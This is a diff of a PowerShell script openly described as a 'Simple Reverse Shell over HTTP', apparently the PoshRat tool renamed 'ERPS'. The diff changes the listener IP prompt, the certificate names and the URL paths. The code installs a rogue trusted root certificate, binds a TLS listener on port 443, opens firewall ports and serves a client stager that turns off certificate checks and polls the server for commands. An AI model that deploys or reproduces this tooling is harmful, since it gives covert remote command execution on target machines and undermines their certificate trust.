@@ -1,7 +1,7 @@
 <#
   .SYNOPSIS
   
-  Simple Reverse Shell over HTTP. Deliver the link to the target and wait for connectback.
+  Simple Reverse Shell over HTTP. After initiating listener, deploy endpoint script package to target.
   
   .PARAMETER Server
   
@@ -9,7 +9,8 @@
   
 #>
 
-$Server = '127.0.0.1' #Listening IP. Change This.
+#Ask Analyst for IP
+$Server = Read-Host -Prompt 'Enter the IP address to listen on'
 
 function Invoke-CreateCertificate([string] $certSubject, [bool] $isCA)
 {
@@ -17,7 +18,7 @@ function Invoke-CreateCertificate([string] $certSubject, [bool] $isCA)
 	$dn = new-object -com "X509Enrollment.CX500DistinguishedName"
 	$dn.Encode( "CN=" + $CAsubject, $dn.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
 	#Issuer Property for cleanup
-	$issuer = "__PoshRat_Trusted_Root"
+	$issuer = "__ERPS_Trusted_Root"
 	$issuerdn = new-object -com "X509Enrollment.CX500DistinguishedName"
 	$issuerdn.Encode("CN=" + $issuer, $dn.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
 	# Create a new Private Key
@@ -65,7 +66,7 @@ function Invoke-CreateCertificate([string] $certSubject, [bool] $isCA)
 	}
 	else
 	{              
-		$signer = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "__PoshRat_Trusted_Root" })
+		$signer = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "__ERPS_Trusted_Root" })
 		$signerCertificate =  new-object -com "X509Enrollment.CSignerCertificate"
 		$signerCertificate.Initialize(1,0,4, $signer.Thumbprint)
 		$cert.SignerCertificate = $signerCertificate
@@ -81,7 +82,7 @@ function Invoke-CreateCertificate([string] $certSubject, [bool] $isCA)
 	{              
 									
 		# Need a Better way to do this...
-		$CACertificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "__PoshRat_Trusted_Root" })
+		$CACertificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "__ERPS_Trusted_Root" })
 		# Install CA Root Certificate
 		$StoreScope = "LocalMachine"
 		$StoreName = "Root"
@@ -100,10 +101,10 @@ function Invoke-CreateCertificate([string] $certSubject, [bool] $isCA)
 
 #Install Root and Self-Signed SSL/TLS Certificate
 
-$CAcertificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "__PoshRat_Trusted_Root"  })
+$CAcertificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "__ERPS_Trusted_Root"  })
 	if ($CACertificate -eq $null)
 	{
-		Invoke-CreateCertificate "__PoshRat_Trusted_Root" $true
+		Invoke-CreateCertificate "__ERPS_Trusted_Root" $true
 	}
 	
 $SelfieSigned = Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $Server  }
@@ -134,18 +135,20 @@ $listener.Prefixes.Add('https://+:443/')
 
 $sslThumbprint = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $Server  }).Thumbprint 
 #Arbitrary appid Just needed for Binding
+#Changing the original appID guid from e46ad221-627f-4c05-9bb6-2529ae1fa815 to 793f8732-ba2e-49e4-b44a-d119e4a7151d //LJC
+
 $sslThumbprint #Print to Console For verification
 
 $cleanup = 'netsh http delete sslcert ipport=0.0.0.0:443'
 iex $cleanup 
-$installCert = "netsh http add sslcert ipport=0.0.0.0:443 certhash=$sslThumbprint appid='{e46ad221-627f-4c05-9bb6-2529ae1fa815}'"
+$installCert = "netsh http add sslcert ipport=0.0.0.0:443 certhash=$sslThumbprint appid='{793f8732-ba2e-49e4-b44a-d119e4a7151d}'"
 iex $installCert
 'SSL Certificates Installed...'
 
-netsh advfirewall firewall delete rule name="PoshRat 80" | Out-Null
-netsh advfirewall firewall add rule name="PoshRat 80" dir=in action=allow protocol=TCP localport=80 | Out-Null
-netsh advfirewall firewall delete rule name="PoshRat 443" | Out-Null
-netsh advfirewall firewall add rule name="PoshRat 443" dir=in action=allow protocol=TCP localport=443 | Out-Null
+netsh advfirewall firewall delete rule name="ERPS 80" | Out-Null
+netsh advfirewall firewall add rule name="ERPS 80" dir=in action=allow protocol=TCP localport=80 | Out-Null
+netsh advfirewall firewall delete rule name="ERPS 443" | Out-Null
+netsh advfirewall firewall add rule name="ERPS 443" dir=in action=allow protocol=TCP localport=443 | Out-Null
 
 
 $listener.Start()
@@ -163,7 +166,7 @@ while ($true) {
 					
 					function Invoke-CertCheck ()
 					{	
-						$Uri = "https://'+$Server+'/rat"
+						$Uri = "https://'+$Server+'/erps"
 						[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 						$request = [System.Net.HttpWebRequest]::Create($uri)
 						$request.GetResponse().Dispose()
@@ -184,7 +187,7 @@ while ($true) {
 					
 					
 					$p = [System.Net.WebRequest]::GetSystemWebProxy()
-					$s = $h +"' + $Server + '/rat"
+					$s = $h +"' + $Server + '/erps"
 					$w = New-Object Net.WebClient 
 					$w.Proxy = $p
 					while($true)
@@ -202,10 +205,10 @@ while ($true) {
 	
     }		 
 	
-	if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "POST") ) { 
+	if ($request.Url -match '/erps$' -and ($request.HttpMethod -eq "POST") ) { 
 		Receive-Request($request)	
 	}
-    if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "GET")) {  
+    if ($request.Url -match '/erps$' -and ($request.HttpMethod -eq "GET")) {  
 		$c = "PS-HTTP"
 		if($request.IsSecureConnection) {$c = "PS-HTTPS"}
         $response.ContentType = 'text/plain'
